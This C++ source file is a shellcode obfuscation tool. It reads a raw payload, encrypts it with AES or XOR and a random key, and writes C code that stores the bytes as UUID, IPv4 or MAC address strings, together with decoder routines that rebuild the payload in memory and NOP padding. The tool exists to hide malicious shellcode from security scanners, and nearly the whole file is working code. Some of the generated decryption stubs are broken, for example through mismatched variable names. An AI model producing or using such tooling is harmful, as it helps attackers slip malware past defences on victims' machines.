#include "aes.c"
#include <iostream>
#include <random>
#include <stdio.h>
#include <stdlib.h>
#include <vector>
#include <cstdio>
#include <cstring>
#include <Windows.h>
#pragma warning(disable:4996)


// ---------------------------------------------------------------------------
// ############################## Misc #######################################
 
// Round up to the nearest multiple of n
long roundUp(long numToRound, long multiple)
{
    if (multiple == 0)
        return numToRound;

    int remainder = numToRound % multiple;
    if (remainder == 0)
        return numToRound;

    return numToRound + multiple - remainder;
}


// ---------------------------------------------------------------------------
// ########################## UUIDfuscation ##################################

// Generate UUID output whilst keeping track of endianess
const char* GenerateUUID(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {
    char* Output0 = new char[32];
    char* Output1 = new char[32];
    char* Output2 = new char[32];
    char* Output3 = new char[32];
    char* result = new char[128];
    sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);
    sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);
    sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);
    sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);
    sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);
    return (const char*)result;
}

// Convert the encrypted payload to an UUID array
void GenerateUUIDOutput(SIZE_T payloadSize, unsigned char* payload, FILE* file) {
    
    char WriteConfig[128], CharUUID[128];
    char WriteDecoderFunc[1517] = "typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(RPC_CSTR StringUuid, UUID* Uuid);\n\nBOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {\n\n\tPBYTE pBuffer = NULL, TmpBuffer = NULL;\n\tSIZE_T sBuffSize = NULL;\n\tRPC_STATUS STATUS = NULL;\n\n\t// Getting UuidFromStringA address from Rpcrt4.dll\n\tfnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT(\"RPCRT4\")), \"UuidFromStringA\");\n\tif (pUuidFromStringA == NULL) {\n\t\tprintf(\"[!] GetProcAddress Failed With Error : %%d \\n\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\tsBuffSize = NmbrOfElements * 16;\n\npBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);\n\tif (pBuffer == NULL) {\n\t\tprintf(\"[!] HeapAlloc Failed With Error : %%d \\n\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\tTmpBuffer = pBuffer;\n\n\t// Loop through all the UUID strings saved in UuidArray\n\tfor (int i = 0; i < NmbrOfElements; i++) {\n\n\t\t// Deobfuscating one UUID string at a time\n\t\t// UuidArray[i] is a single UUID string from the array UuidArray\n\t\tif ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {\n\t\t\t// if it failed\n\t\t\tprintf(\"[!] UuidFromStringA Failed At [%%s] With Error 0x%%0.8X\", UuidArray[i], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\n\t\t// 16 bytes are written to TmpBuffer at a time\n\t\t// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes\n\t\tTmpBuffer = (PBYTE)(TmpBuffer + 16);\n\t}\n\n\t*ppDAddress = pBuffer;\n\t*pDSize = sBuffSize;\n\n\treturn TRUE;\n}";

    fprintf(file, "char* UUIDArray[%d] = { \n\t", (int)(payloadSize / 16));

    // Algorithm that converts raw shellcode to UUIDs
    int c = 16, C = 0;
    std::vector<const char*> UUIDs;
    for (int i = 0; i < payloadSize; i++) {
        if (c == 16) {
            C++;
            const char* UUID = GenerateUUID(
                payload[i], payload[i + 1], payload[i + 2], payload[i + 3],
                payload[i + 4], payload[i + 5], payload[i + 6], payload[i + 7],
                payload[i + 8], payload[i + 9], payload[i + 10], payload[i + 11],
                payload[i + 12], payload[i + 13], payload[i + 14], payload[i + 15]
            );
            UUIDs.push_back(UUID);
            if (i == payloadSize - 16) {
                sprintf(CharUUID, "\"%s\"", UUIDs[C - 1]);
                fprintf(file, "%s", CharUUID);;
                break;
            }
            else {
                sprintf(CharUUID, "\"%s\", ", UUIDs[C - 1]);
                fprintf(file, "%s", CharUUID);
            }
            c = 1;

            if (C % 3 == 0) {
                fprintf(file, "\n\t");
            }
        }
        else {
            c++;
        }
    }


    // print out deobfuscation function
    fprintf(file, "\n};\n");
    sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)payloadSize);
    fprintf(file, "%s", WriteConfig);
    fprintf(file, "%s", WriteDecoderFunc);

    // Delete the memory for each UUID
    for (int i = 0; i < UUIDs.size(); i++) {
        delete[] UUIDs[i];
    }
}


// ---------------------------------------------------------------------------
// ######################### IPv4fuscation ###################################

// generate IPv4 output
const char* GenerateIPv4(uint32_t ip) {
    unsigned char bytes[4];
    char* Output = new char[32];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    sprintf(Output, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
    return (const char*)Output;
}

// Generate hex IPv4 output
uint32_t GenerateIPv4Hex(int a, int b, int c, int d) {
    uint32_t result = ((uint32_t)a << 24) | ((uint32_t)b << 16) | (c << 8) | d;
    return result;
}

// Convert the encrypted payload to a IPv4 array
void GenerateIPv4Output(SIZE_T payloadSize, unsigned char* payload, FILE* file) {

   
    char WriteConfig[128], CharIP[128];
    char WriteDecoderFunc[1024] = "BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV4[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 4;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";

    fprintf(file, "char* IPv4Array [%d] = {\n\t", (int)(payloadSize / 4));

    // Algorithm that converts raw shellcode to IPv4 addresses
    int c = 4, C = 0;
    uint32_t HexVal;
    std::vector<const char*> IPs;
    for (int i = 0; i <= payloadSize; i++) {
        if (c == 4) {
            C++;
            HexVal = GenerateIPv4Hex(payload[i], payload[i + 1], payload[i + 2], payload[i + 3]);
            const char* IP = GenerateIPv4(HexVal);
            IPs.push_back(IP);
            if (i == payloadSize - 4) {
                sprintf(CharIP, "\"%s\"", IPs[C - 1]);
                fprintf(file, "%s", CharIP);;
                break;
            }
            else {
                sprintf(CharIP, "\"%s\", ", IPs[C - 1]);
                fprintf(file, "%s", CharIP);
            }
            c = 1;
            if (C % 12 == 0) {
                fprintf(file, "\n\t");
            }
        }
        else {
            c++;
        }
    }
    // print out deobfuscation function
    fprintf(file, "\n};\n");
    sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)payloadSize);
    fprintf(file, "%s", WriteConfig);
    fprintf(file, "%s", WriteDecoderFunc);

    // Delete the memory for each IP
    for (int i = 0; i < IPs.size(); i++) {
        delete[] IPs[i];
    }
}


// ---------------------------------------------------------------------------
// ####################### MACfuscation ######################################

// Generate MAC output
const char* GenerateMAC(uint64_t MAC) {
    unsigned char bytes[6];
    char* Output = new char[64];
    bytes[0] = MAC & 0xFF;
    bytes[1] = (MAC >> 8) & 0xFF;
    bytes[2] = (MAC >> 16) & 0xFF;
    bytes[3] = (MAC >> 24) & 0xFF;
    bytes[4] = (MAC >> 32) & 0xFF;
    bytes[5] = (MAC >> 40) & 0xFF;
    sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", (bytes[5]), (bytes[4]), (bytes[3]), (bytes[2]), (bytes[1]), (bytes[0]));
    return (const char*)Output;
}

// Generate hex MAC values
uint64_t GenerateMACHex(int a, int b, int c, int d, int e, int f) {
    uint64_t result = ((uint64_t)a << 40) | ((uint64_t)b << 32) | ((uint64_t)c << 24) | ((uint64_t)d << 16) | ((uint64_t)e << 8) | f;
    return result;
}

// Convert the encrypted payload to a MAC address array
void GenerateMACOutput(SIZE_T payloadSize, unsigned char* payload, FILE* file) {


    char WriteConfig[128], CharMAC[128];
    char WriteDecoderFunc[1024] = "BOOL DecodeMACFuscation(const char* MAC[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, (DL_EUI48*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlEthernetStringToAddressA failed for %s result %x\", MAC[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 6;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";

    fprintf(file, "char* MACArray [%d] = {\n\t", (int)(payloadSize / 4));


    // Algorithm that converts raw shellcode to MAC addresses
    int c = 6, C = 0;
    uint64_t HexVal;
    std::vector<const char*> macs;
    for (int i = 0; i <= payloadSize; i++) {
        if (c == 6) {
            C++;
            HexVal = GenerateMACHex(payload[i], payload[i + 1], payload[i + 2], payload[i + 3], payload[i + 4], payload[i + 5]);
            const char* mac = GenerateMAC(HexVal);
            macs.push_back(mac);
            if (i == payloadSize - 6) {
                sprintf(CharMAC, "\"%s\"", macs[C - 1]);
                fprintf(file, "%s", CharMAC);
                break;
            }
            else {
                sprintf(CharMAC, "\"%s\", ", macs[C - 1]);
                fprintf(file, "%s", CharMAC);
            }
            c = 1;
            if (C % 8 == 0) {
                fprintf(file, "\n\t");
            }
        }
        else {
            c++;
        }
    }

    fprintf(file, "\n};\n");
    sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)payloadSize);
    fprintf(file, "%s", WriteConfig);
    fprintf(file, "%s", WriteDecoderFunc);

    // Delete the memory for each MAC string
    for (int i = 0; i < macs.size(); i++) {
        delete[] macs[i];
    }
}


// ---------------------------------------------------------------------------
// ###################### Encryption functions ###############################

void EncryptAES(SIZE_T file_size, unsigned char* payload, FILE* file) {

    // print the header
    fprintf(file, "#include \"aes.c\"\n");
    char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
    fprintf(file, "%s", WriteHeader);

    // Generate a key and IV
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::vector <unsigned char> key_init(16);
    std::vector <unsigned char> iv_init(16);
    for (auto& b : key_init) {
        b = static_cast<unsigned char>(dis(gen));
    }
    for (auto& b : iv_init) {
        b = static_cast<unsigned char>(dis(gen));
    }
    const unsigned char* Key = key_init.data();
    const unsigned char* IV = iv_init.data();

    // Encrypt the payload using the generated key and IV
    AES_ctx ctx = { 0 };
    AES_init_ctx_iv(&ctx, Key, IV);
    AES_CBC_encrypt_buffer(&ctx, payload, file_size);

    // Write the key
    fprintf(file, "\nunsigned char key[] {");
    for (int i = 0; i < key_init.size(); i++) {
        fprintf(file, "0x%x, ", Key[i]);
    }
    fprintf(file, "};\n");

    // Write the IV
    fprintf(file, "\nunsigned char IV[] {");
    for (int i = 0; i < iv_init.size(); i++) {
        fprintf(file, "0x%x, ", IV[i]);
    }
    fprintf(file, "};\n");

    // Write the decryption function
    fprintf(file, "\nAES_ctx ctx = { 0 };\nAES_init_ctx_iv(&ctx, key, iv);\nAES_CBC_decrypt_buffer(&ctx, payload, sizeof(payload));\n");
}

void EncryptXOR(SIZE_T file_size, unsigned char* payload, FILE* file) {

    char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
    fprintf(file, "%s", WriteHeader);

    // Generate a random key
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::vector <unsigned char> Key(16);
    for (auto& b : Key) {
        b = static_cast<unsigned char>(dis(gen));
    }

    // XOR with every byte of the key for hardening
    for (size_t i = 0, j = 0; i < file_size; i++, j++) {
        if (j == Key.size()) {
            j = 0;
        }
        payload[i] = payload[i] ^ Key[j];
    }

    // Write the key
    fprintf(file, "\nunsigned char key[] {");
    for (int i = 0; i < Key.size(); i++) {
        fprintf(file, "0x%x, ", Key[i]);
    }
    fprintf(file, "};\n");

    // Write the decryption function
    fprintf(file, "\nfor (size_t i = 0, j = 0; i < file_size; i++, j++) {\n\tif (j == Key.size()) {\n\t\tj = 0;\n\t}\n\tpayload[i] = payload[i] ^ Key[j];\n}\n");
}


// ---------------------------------------------------------------------------
// ############################ Main #########################################

int main(int argc, char* argv[]) {

    // Check if the correct number of arguments have been passed
    if (argc != 5) {
        std::cout << "Usage: " << argv[0] << " <PayloadFile> <OutputFile> <EncryptionMethod> <ObfuscationMethod>\n";
        return 1;
    }

    // Open payload file in binary mode
    FILE* payloadFile = fopen(argv[1], "rb");
    if (payloadFile == NULL) {
        printf("[!] Failed to open file.\n");
        return 1;
    }
    
    // Open output file in append mode
    FILE* outputFile = fopen(argv[2], "w");
    if (outputFile == NULL) {
        printf("[!] Failed to open output file.\n");
        return 1;
    }

    // Define the encryption and obfuscation type
    const std::string encryptionAlgorithm = argv[3];
    const std::string obfuscationMethod = argv[4];

    // Check for correct usage
    if (encryptionAlgorithm != "AES" && encryptionAlgorithm != "XOR" && encryptionAlgorithm != "NONE") {
        printf("[!] Please select a valid encryption algorithm. Currently supported options: AES, XOR, NONE (case sensitive)\n");
    }
    if (obfuscationMethod != "MAC" && obfuscationMethod != "IPv4" && obfuscationMethod != "UUID") {
        printf("\n[!] Please select a valid obfuscation method. Currently supported options: IPv4, MAC, UUID (case sensitive)\n");
    }

    // Get the size of the file
    fseek(payloadFile, 0, SEEK_END);
    long file_size = ftell(payloadFile);
    rewind(payloadFile);

    // Calculate the required padding amount
    int requiredPadding = 0;
    if (obfuscationMethod == "MAC" && file_size % 6 != 0) {
            requiredPadding = roundUp(file_size, 6) - file_size;
    }
    if (obfuscationMethod == "IPv4" && file_size % 4 != 0) {
            requiredPadding = roundUp(file_size, 4) - file_size;
    }
    if (obfuscationMethod == "UUID" && file_size % 16 != 0) {
            requiredPadding = roundUp(file_size, 16) - file_size;
    }

    // Create a buffer for the payload
    unsigned char* payload = NULL;
    if (requiredPadding != 0) {
        payload = new unsigned char[file_size + requiredPadding];
        printf("[i] Payload is of size %ld.\n", file_size);
        printf("[!] Will pad with %ld bytes.\n", requiredPadding);

        if (payload == NULL) {
            printf("[!] Memory allocation failed.\n");
            return 1;
        }
    }
    else {
        payload = new unsigned char[file_size];
        printf("[i] Payload is of size %ld.\n", file_size);

        if (payload == NULL) {
            printf("[!] Memory allocation failed.\n");
            return 1;
        }
    }

    // Copy the payload into the buffer
    size_t readBytes = fread(payload, 1, file_size, payloadFile);
    if (readBytes != file_size) {
        printf("[!] Error reading file or end of file reached.\n");
        return 1;
    }

    // Fill the rest of the buffer with NOP bytes, if needed
    if (requiredPadding != 0) {
        memset(payload + file_size, 0x90, requiredPadding);
        printf("[i] Total size of the payload with padding: %ld\n", file_size + requiredPadding);

        // Validate the padding bytes
        for (long i = file_size; i < file_size + requiredPadding; i++) {
            if (payload[i] != 0x90) {
                printf("[!] Padding not filled correctly.\n");
                return 1;
            }
        }
    }

    // Close the payload file
    fclose(payloadFile);
    file_size = file_size + requiredPadding;

    // Encrypt
    if (encryptionAlgorithm == "AES") {
        EncryptAES(file_size, payload, outputFile);
    }
    if (encryptionAlgorithm == "XOR") {
        EncryptXOR(file_size, payload, outputFile);
    }
    else {

    }

    // Obfuscate
    if (obfuscationMethod == "MAC") {
        GenerateMACOutput(file_size, payload, outputFile);
    }
    if (obfuscationMethod == "IPv4") {
        GenerateIPv4Output(file_size, payload, outputFile);
    }
    if (obfuscationMethod == "UUID") {
        GenerateUUIDOutput(file_size, payload, outputFile);
    }

    fclose(outputFile);

    return 0;
}